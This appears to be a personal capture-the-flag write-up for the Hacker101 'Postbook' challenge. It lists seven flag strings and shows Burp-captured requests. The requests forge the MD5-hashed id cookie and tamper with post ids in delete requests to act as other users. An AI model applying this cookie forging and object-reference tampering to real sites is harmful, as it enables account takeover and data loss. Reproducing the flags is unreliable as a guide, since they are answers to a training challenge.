# Postbook [EASY]

https://095ee73f8f602f3c0b046f2f49bbc83b.ctf.hacker101.com/
[writeups](https://www.youtube.com/watch?v=reHGY6YC1yY&list=PLwZzfJHW8fl8vA2A9XHHv8_N1AgA6rM3h&index=24)

Where to check for flags:
- Page Source
- login into other
- Changing end url -> /edit/3



> ^FLAG^ab13754e9cdd311ff97f8d79f17b2058859ceb5c06690f6ae0a75a4d1fd16bec$FLAG$ [0]
> ^FLAG^8ff7c901569e27a22a221f4d6a8cc487e64539f08f10acccf5295299cf006ee3$FLAG$ [1]
> ^FLAG^6903429da18dc3d25d2f61a990bc5847b457506796d06f3105d518dc9ed9fa81$FLAG$ [2]
> ^FLAG^852673882d8eef8244abbcbd6cbb3ac2d9d51cd57b4315f7332ff38cecbccd2b$FLAG$ [3]
> ^FLAG^e0bcf273af92907664cafa4d88856519285a3afb7ce6a64d8a9cb04bd311b1ec$FLAG$ [4]
> ^FLAG^36b46107fe3794f3774e6cd0a632873789a63871b0c12a58699ae24056bc0685$FLAG$ [5]
> ^FLAG^f19c8fcb267cf4aa708872ed2628309e750fffa57bc3357e0b945b5d26bfbb08$FLAG$ [6]

In login page 'Burp Suite'

---
GET /index.php?page=home.php HTTP/2
Host: 79590f8031a0b0d2c5d260da4642d4d6.ctf.hacker101.com
Cookie: id=c81e728d9d4c2f636f067f89cc14862c
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="113", "Not-A.Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://79590f8031a0b0d2c5d260da4642d4d6.ctf.hacker101.com/index.php?page=sign_in.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
---

> Cookie: "c81e728d9d4c2f636f067f89cc14862c" => 2
>>> echo 1 | md5sum
> b026324c6904b2a9cb4b88d6d61c81d1
> Web: c4ca4238a0b923820dcc509a6f75849b

> Delete Post id: "c9f0f895fb98ab9159f51fd0297e236d"
> Md5 Decrypted: 8

> GET /index.php?page=delete.php&id=c9f0f895fb98ab9159f51fd0297e236d HTTP/2
Host: 79590f8031a0b0d2c5d260da4642d4d6.ctf.hacker101.com
Cookie: id=c81e728d9d4c2f636f067f89cc14862c
>>> GET /index.php?page=delete.php&id=c4ca4238a0b923820dcc509a6f75849b HTTP/2
Host: 79590f8031a0b0d2c5d260da4642d4d6.ctf.hacker101.com
Cookie: id=c81e728d9d4c2f636f067f89cc14862c
> GET /index.php?page=home.php&message=^FLAG^f19c8fcb267cf4aa708872ed2628309e750fffa57bc3357e0b945b5d26bfbb08$FLAG$ 


